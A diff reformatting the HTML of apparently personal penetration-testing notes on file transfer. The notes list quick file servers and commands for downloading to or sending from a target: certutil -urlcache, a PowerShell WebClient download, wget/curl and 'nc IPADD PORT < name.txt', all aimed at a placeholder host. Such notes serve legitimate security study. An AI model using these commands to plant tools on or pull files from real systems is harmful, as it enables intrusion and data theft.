@@ -9,83 +9,11 @@
 
 <span style="background-color: rgb(255, 255, 255); font-size: 22px;"><strong><span style="color: rgb(184, 49, 47);">- for more direct windows transfers including scripts for auto downloading refer to transfers.txt</span></strong></span>
 <br>
-<p class=MsoNormal><span style='font-size:26.0pt;line-height:106%;color:white;
-mso-themecolor:background1;background:red;mso-highlight:red'>Useful commands
-for file transfers</span><span style='font-size:26.0pt;line-height:106%;
-color:white;mso-themecolor:background1'><o:p></o:p></span></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal>python3 -m <span class=SpellE>http.server</span> <o:p></o:p></p>
-
-<p class=MsoNormal>python2 -m <span class=SpellE>SimpleHTTPServer</span> <o:p></o:p></p>
-
-<p class=MsoNormal><span class=SpellE>php</span> -S 0.0.0.0:80<o:p></o:p></p>
-
-<p class=MsoNormal>ruby -run -e httpd . -p 8080<o:p></o:p></p>
-
-<p class=MsoNormal>python3 -m <span class=SpellE>pyftpdlib</span> -p 21 <o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal>** can also use <span class=SpellE>impacket</span> <span
-class=SpellE>smb</span> server<o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span style='font-size:26.0pt;line-height:106%;background:
-lime;mso-highlight:lime'>Transfer files:</span><span style='font-size:26.0pt;
-line-height:106%'><o:p></o:p></span></p>
-
-<p class=MsoNormal><span style='font-size:26.0pt;line-height:106%;color:#2E75B6;
-mso-themecolor:accent5;mso-themeshade:191;mso-style-textfill-fill-color:#2E75B6;
-mso-style-textfill-fill-themecolor:accent5;mso-style-textfill-fill-alpha:100.0%;
-mso-style-textfill-fill-colortransforms:lumm=75000'>Windows<o:p></o:p></span></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span class=SpellE>Certutl</span><o:p></o:p></p>
-
-<p class=MsoNormal>C:\&gt;certutil -<span class=SpellE>urlcache</span> -f
-http://IPADD/name.txt name.txt<o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span class=SpellE>NetUse</span>:<o:p></o:p></p>
-
-<p class=MsoNormal>C:\&gt;net use * \\IPADD\Share<o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span class=SpellE>Powershell</span>:<o:p></o:p></p>
-
-<p class=MsoNormal>C:\&gt;powershell.exe (New-Object <span class=SpellE>System.Net.WebClient</span>).<span
-class=SpellE>DownloadFile</span>('http://IPADD/name.txt', 'name.txt')<o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span style='font-size:26.0pt;line-height:106%;color:red'>Linux<o:p></o:p></span></p>
-
-<p class=MsoNormal><span class=SpellE>wget</span> (and use -O name.txt to
-output)<o:p></o:p></p>
-
-<p class=MsoNormal>curl (-o name.txt to output)<o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal>SCP - look at <span class=SpellE>scp</span> section in <span
-class=SpellE>cheatsheets</span><o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span class=SpellE>Netcat</span><o:p></o:p></p>
-
-<p class=MsoNormal>output file and input file<o:p></o:p></p>
-
-<p class=MsoNormal>&gt; name.txt <o:p></o:p></p>
-
-<p class=MsoNormal><o:p>&nbsp;</o:p></p>
-
-<p class=MsoNormal><span class=SpellE>nc</span> IPADD PORT &lt; name.txt </p>
+<pre><p><span style="font-size: 30px; background-color: rgb(184, 49, 47);">Useful commands for file transfers</span></p>
+<p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">python3 -m http.server </span></p>
+<p><span style="font-size: 20px;">python2 -m SimpleHTTPServer </span></p><p><span style="font-size: 20px;">php -S 0.0.0.0:80</span></p>
+<p><span style="font-size: 20px;">ruby -run -e httpd . -p 8080</span></p><p><span style="font-size: 20px;">python3 -m pyftpdlib -p 21 </span></p>
+<p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">** can also use impacket smb server</span></p><p><span style="font-size: 20px;"> </span></p>
+<p><span style="font-size: 30px; background-color: rgb(65, 168, 95);">Transfer files:</span></p><p><span style="font-size: 26px;"><strong><span style="color: rgb(41, 105, 176);">Windows</span></strong></span></p>
+<p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">Certutl</span></p><p><span style="font-size: 20px;">C:\&gt;certutil -urlcache -f http://IPADD/name.txt name.txt</span></p><p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">NetUse:</span></p><p><span style="font-size: 20px;">C:\&gt;net use * \\IPADD\Share</span></p><p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">Powershell:</span></p><p><span style="font-size: 20px;">C:\&gt;powershell.exe (New-Object System.Net.WebClient).DownloadFile(&apos;http://IPADD/name.txt&apos;, &apos;name.txt&apos;)</span></p><p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 26px; color: rgb(41, 105, 176);">Linux</span></p><p><span style="font-size: 20px;">wget (and use -O name.txt to output)</span></p><p><span style="font-size: 20px;">curl (-o name.txt to output)</span></p><p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">SCP - look at scp section in cheatsheets</span></p><p><span style="font-size: 20px;"> </span></p><p><span style="font-size: 20px;">Netcat</span></p><p><span style="font-size: 20px;">output file and input file</span></p><p><span style="font-size: 20px;">&gt; name.txt </span></p><p><span style="font-size: 20px;"> </span></p>
+<p><span style="font-size: 20px;">nc IPADD PORT &lt; name.txt </span></p></pre>
